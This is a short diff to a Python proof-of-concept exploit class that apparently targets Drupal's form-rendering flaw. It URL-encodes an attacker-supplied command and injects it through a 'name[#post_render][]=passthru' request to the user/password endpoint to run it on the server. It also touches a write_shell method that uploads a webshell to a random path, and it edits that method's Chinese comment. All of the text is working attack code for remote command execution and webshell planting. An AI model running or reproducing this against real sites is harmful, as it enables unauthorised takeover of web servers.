@@ -77,6 +77,7 @@ class DemoPOC(POCBase):
         if cmd == "ws":
             res = self.write_shell()
             return res
+        cmd = urllib.parse.quote(cmd)
         url1 = self.url.rstrip(
             '/') + "?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]={}".format(cmd)
         res = requests.post(url1, data=self.body_1)
@@ -115,7 +116,7 @@ class DemoPOC(POCBase):
 
 
     def write_shell(self):
-        # 写入webshell,好像有点问题，框架是要反弹shell
+        # 写入webshell
         result = {}
         path = random_str(length=4)
         shell_content = urllib.parse.quote(self.get_option("shell_content"))
